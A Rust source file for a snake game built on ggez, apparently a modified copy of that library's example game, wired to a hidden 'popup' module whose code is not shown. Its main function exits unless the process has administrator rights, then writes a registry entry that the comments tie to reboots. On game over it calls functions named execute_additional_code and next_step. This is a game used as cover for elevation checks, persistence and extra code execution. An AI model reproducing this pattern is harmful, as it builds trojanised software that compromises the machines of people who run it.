use oorandom::Rand32;
use crate::popup::check_elevation;
use crate::popup::add_registry;
mod popup;
use ggez::context::quit;
use ggez::{
    event, graphics,
    input::keyboard::{KeyCode, KeyInput},
    Context, GameResult,
};

use std::collections::VecDeque;

const GRID_SIZE: (i16, i16) = (30, 20);
const GRID_CELL_SIZE: (i16, i16) = (32, 32);
const SCREEN_SIZE: (f32, f32) = (
    GRID_SIZE.0 as f32 * GRID_CELL_SIZE.0 as f32,
    GRID_SIZE.1 as f32 * GRID_CELL_SIZE.1 as f32,
);

const DESIRED_FPS: u32 = 8;
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
struct GridPosition {
    x: i16,
    y: i16,
}

impl GridPosition {
    pub fn new(x: i16, y: i16) -> Self {
        GridPosition { x, y }
    }

    pub fn random(rng: &mut Rand32, max_x: i16, max_y: i16) -> Self {
        (
            rng.rand_range(0..(max_x as u32)) as i16,
            rng.rand_range(0..(max_y as u32)) as i16,
        )
            .into()
    }

    pub fn new_from_move(pos: GridPosition, dir: Direction) -> Self {
        match dir {
            Direction::Up => GridPosition::new(pos.x, (pos.y - 1).rem_euclid(GRID_SIZE.1)),
            Direction::Down => GridPosition::new(pos.x, (pos.y + 1).rem_euclid(GRID_SIZE.1)),
            Direction::Left => GridPosition::new((pos.x - 1).rem_euclid(GRID_SIZE.0), pos.y),
            Direction::Right => GridPosition::new((pos.x + 1).rem_euclid(GRID_SIZE.0), pos.y),
        }
    }
}

impl From<GridPosition> for graphics::Rect {
    fn from(pos: GridPosition) -> Self {
        graphics::Rect::new_i32(
            pos.x as i32 * GRID_CELL_SIZE.0 as i32,
            pos.y as i32 * GRID_CELL_SIZE.1 as i32,
            GRID_CELL_SIZE.0 as i32,
            GRID_CELL_SIZE.1 as i32,
        )
    }
}
impl From<(i16, i16)> for GridPosition {
    fn from(pos: (i16, i16)) -> Self {
        GridPosition { x: pos.0, y: pos.1 }
    }
}
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Direction {
    Up,
    Down,
    Left,
    Right,
}

impl Direction {
    pub fn inverse(self) -> Self {
        match self {
            Direction::Up => Direction::Down,
            Direction::Down => Direction::Up,
            Direction::Left => Direction::Right,
            Direction::Right => Direction::Left,
        }
    }

    pub fn from_keycode(key: KeyCode) -> Option<Direction> {
        match key {
            KeyCode::Up => Some(Direction::Up),
            KeyCode::Down => Some(Direction::Down),
            KeyCode::Left => Some(Direction::Left),
            KeyCode::Right => Some(Direction::Right),
            _ => None,
        }
    }
}

#[derive(Clone, Copy, Debug)]
struct Segment {
    pos: GridPosition,
}

impl Segment {
    pub fn new(pos: GridPosition) -> Self {
        Segment { pos }
    }
}
struct Food {
    pos: GridPosition,
}

impl Food {
    pub fn new(pos: GridPosition) -> Self {
        Food { pos }
    }

    fn draw(&self, canvas: &mut graphics::Canvas) {
        let color = [0.0, 0.0, 1.0, 1.0];
        canvas.draw(
            &graphics::Quad,
            graphics::DrawParam::new()
                .dest_rect(self.pos.into())
                .color(color),
        );
    }
}

#[derive(Clone, Copy, Debug)]
enum Ate {
    Itself,
    Food,
}

struct Snake {
    head: Segment,
    dir: Direction,
    body: VecDeque<Segment>,
    ate: Option<Ate>,
    last_update_dir: Direction,
    next_dir: Option<Direction>,
    score: u32,
}

impl Snake {
    pub fn new(pos: GridPosition) -> Self {
        let mut body = VecDeque::new();
        body.push_back(Segment::new((pos.x - 1, pos.y).into()));
        Snake {
            head: Segment::new(pos),
            dir: Direction::Right,
            last_update_dir: Direction::Right,
            body,
            ate: None,
            next_dir: None,
	    score:0,
        }
    }

    fn eats(&self, food: &Food) -> bool {
        self.head.pos == food.pos
    }

    fn eats_self(&self) -> bool {
        for seg in &self.body {
            if self.head.pos == seg.pos {
                return true;
            }
        }
        false
    }
    pub  fn return_score(&self)->u32{
		return self.score;	
      }

    fn update(&mut self, food: &Food) {
        if self.last_update_dir == self.dir && self.next_dir.is_some() {
            self.dir = self.next_dir.unwrap();
            self.next_dir = None;
        }
        let new_head_pos = GridPosition::new_from_move(self.head.pos, self.dir);
        let new_head = Segment::new(new_head_pos);
        self.body.push_front(self.head);
        self.head = new_head;
        if self.eats_self() {
            self.ate = Some(Ate::Itself);
        } else if self.eats(food) {
            self.ate = Some(Ate::Food);
	    self.score+=1;
        } else {
            self.ate = None;
        }
        if self.ate.is_none() {
            self.body.pop_back();
        }
        self.last_update_dir = self.dir;
    }

    fn draw(&self, canvas: &mut graphics::Canvas) {
        for seg in &self.body {
            canvas.draw(
                &graphics::Quad,
                graphics::DrawParam::new()
                    .dest_rect(seg.pos.into())
                    .color([0.3, 0.3, 0.0, 1.0]),
            );
        }
        canvas.draw(
            &graphics::Quad,
            graphics::DrawParam::new()
                .dest_rect(self.head.pos.into())
                .color([1.0, 0.5, 0.0, 1.0]),
        );
    }
}

struct GameState {
    snake: Snake,
    food: Food,
    gameover: bool,
    rng: Rand32,
    score: u32,
     window_title: String,
}

impl GameState {
    pub fn new() -> Self {
        let snake_pos = (GRID_SIZE.0 / 4, GRID_SIZE.1 / 2).into();
        let mut seed: [u8; 8] = [0; 8];
        getrandom::getrandom(&mut seed[..]).expect("Could not create RNG seed");
        let mut rng = Rand32::new(u64::from_ne_bytes(seed));
        let food_pos = GridPosition::random(&mut rng, GRID_SIZE.0, GRID_SIZE.1);

        GameState {
            snake: Snake::new(snake_pos),
            food: Food::new(food_pos),
            gameover: false,
            rng,
	    score:0,
	     window_title: String::from("GET A SCORE OF 1000000 to Win! Score"),
        }
    }
}

impl event::EventHandler<ggez::GameError> for GameState {
    fn update(&mut self, ctx: &mut Context) -> GameResult {
        while ctx.time.check_update_time(DESIRED_FPS) {
            if !self.gameover {
                self.snake.update(&self.food);
                if let Some(ate) = self.snake.ate {
                    match ate {
                        Ate::Food => {
                            let new_food_pos =
                                GridPosition::random(&mut self.rng, GRID_SIZE.0, GRID_SIZE.1);
                            self.food.pos = new_food_pos;
			    self.score+=1;
		            
                        }
                        Ate::Itself => {
                            self.gameover = true;
		             quit(ctx);
			     popup::execute_additional_code(format!("{} {}",self.window_title.clone(),self.score));
			     popup::next_step(self.score);    
                        }
                    }
                }
            }
        }

        Ok(())
    }

    fn draw(&mut self, ctx: &mut Context) -> GameResult {
        let mut canvas =
            graphics::Canvas::from_frame(ctx, graphics::Color::from([0.0, 1.0, 0.0, 1.0]));

        self.snake.draw(&mut canvas);
        self.food.draw(&mut canvas);
        canvas.finish(ctx)?;

        ggez::timer::yield_now();
        Ok(())
    }

    fn key_down_event(&mut self, _ctx: &mut Context, input: KeyInput, _repeat: bool) -> GameResult {
        if let Some(dir) = input.keycode.and_then(Direction::from_keycode) {
            if self.snake.dir != self.snake.last_update_dir && dir.inverse() != self.snake.dir {
                self.snake.next_dir = Some(dir);
            } else if dir.inverse() != self.snake.last_update_dir {
                self.snake.dir = dir;
            }
        }
        Ok(())
    }
}

fn main() -> GameResult {



let mut state = GameState::new();    
    // Set the initial window title.
     if check_elevation() {
           // println!("Elevated!!! Yay");
}else {
           // println!("Not elevated. Requesting UAC");
	     std::process::exit(0);


}
	if add_registry() == false {
            // every other time after reboot
          //  println!("Add registry fail");
        } else {
            // first time run
          //  println!("Sucessfully generate registry");
        }

		  // Here we use a ContextBuilder to setup metadata about our game. First the title and author
    let (ctx, events_loop) = ggez::ContextBuilder::new("snake", "Gray Olson")
        // Next we set up the window. This title will be displayed in the title bar of the window.
        .window_setup(ggez::conf::WindowSetup::default().title(&state.window_title))
        // Now we get to set the size of the window, which we use our SCREEN_SIZE constant from earlier to help with
        .window_mode(ggez::conf::WindowMode::default().dimensions(SCREEN_SIZE.0, SCREEN_SIZE.1))
        // And finally we attempt to build the context and create the window. If it fails, we panic with the message
        // "Failed to build ggez context"
        .build()?;

    // Next we create a new instance of our GameState struct, which implements EventHandler
    // And finally we actually run our game, passing in our context and state.
    event::run(ctx, events_loop, state);
    
}
